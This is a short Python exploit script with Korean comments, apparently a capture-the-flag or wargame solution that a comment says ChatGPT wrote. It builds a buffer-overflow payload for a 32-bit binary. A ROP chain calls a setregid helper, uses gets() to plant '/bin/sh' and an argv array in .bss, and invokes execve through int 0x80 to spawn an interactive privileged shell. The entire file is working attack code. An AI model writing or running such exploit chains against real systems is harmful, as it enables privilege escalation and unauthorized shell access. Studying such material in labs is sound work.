# 순수 chat GPT가 썼으나 그나마 된 코드
# 쉘 실행은 되나 연결은 안 됨
#!/usr/bin/env python3
import sys
from struct import pack

p32 = lambda x: pack("<I", x)

# -------------------------
# 너가 준/확인한 값들
# -------------------------
OFFSET      = 0x4c  # 너 말대로

# ROP_bank gadgets (중간주소로 점프)
POP_EAX_RET = 0x080491b3
POP_EBX_RET = 0x080491b5
POP_ECX_RET = 0x080491b7
POP_EDX_RET = 0x080491b9

# syscall gadget는 프롤로그 피해서 int 0x80 위치로!
SYSCALL     = 0x080491cb  # int 0x80 ; ret

DO_SETREGID = 0x080491d1

# 너가 earlier disas에서 본 gets@plt
GETS_PLT    = 0x08049040  # 혹시 다르면 objdump로 확인해서 수정!

# -------------------------
# 2nd-stage를 써넣을 고정 writable 주소
# (PIE OFF라 고정. .bss나 .data 여유구간 추천)
# -------------------------
STAGE2      = 0x0804c100  # 안전하게 여유있는 곳으로 (필요시 조정)

# stage2 레이아웃
BINSH_ADDR  = STAGE2 + 0x00
DASHI_ADDR  = STAGE2 + 0x08
ARGV_ADDR   = STAGE2 + 0x10  # [binsh, "-i", NULL]

SYS_EXECVE  = 0x0b

# -------------------------
# Stage 1: BOF + ROP chain
#  - do_setregid()
#  - gets(STAGE2)  -> stage2 데이터 메모리에 쓰기
#  - execve("/bin/sh", argv, NULL) via int 0x80
# -------------------------
stage1  = b"A" * OFFSET

# 1) 권한 세팅 (원하면 빼도 됨)
stage1 += p32(DO_SETREGID)

# 2) gets(STAGE2) 호출 (cdecl: retaddr 다음에 arg)
#    gets가 끝나면 스택에는 arg(STAGE2)가 남아있으니
#    POP_EAX_RET로 "한 번 pop" 해서 정리한 뒤 진행
stage1 += p32(GETS_PLT)
stage1 += p32(POP_EAX_RET)   # gets return address
stage1 += p32(STAGE2)        # gets(arg)  -> 이 값이 pop되어 스택 정리됨

# 3) 이제 진짜 execve 세팅
stage1 += p32(POP_EAX_RET)
stage1 += p32(SYS_EXECVE)

stage1 += p32(POP_EBX_RET)
stage1 += p32(BINSH_ADDR)

stage1 += p32(POP_ECX_RET)
stage1 += p32(ARGV_ADDR)

stage1 += p32(POP_EDX_RET)
stage1 += p32(0x0)

stage1 += p32(SYSCALL)

# gets는 '\n'에서 멈추니까 stage1 끝에 newline 필요
stage1 += b"\n"

# -------------------------
# Stage 2: gets로 STAGE2에 써넣을 데이터
#  "/bin/sh\x00" (8 bytes)
#  "-i\x00"      (8 bytes padding)
#  argv[] = { BINSH_ADDR, DASHI_ADDR, 0 }
# -------------------------
stage2  = b"/bin/sh\x00"          # 8 bytes 정확히
stage2 += b"-i\x00" + b"\x00" * 5  # 8 bytes 맞춤
stage2 += p32(BINSH_ADDR)
stage2 += p32(DASHI_ADDR)
stage2 += p32(0x0)
stage2 += b"\n"

sys.stdout.buffer.write(stage1 + stage2)
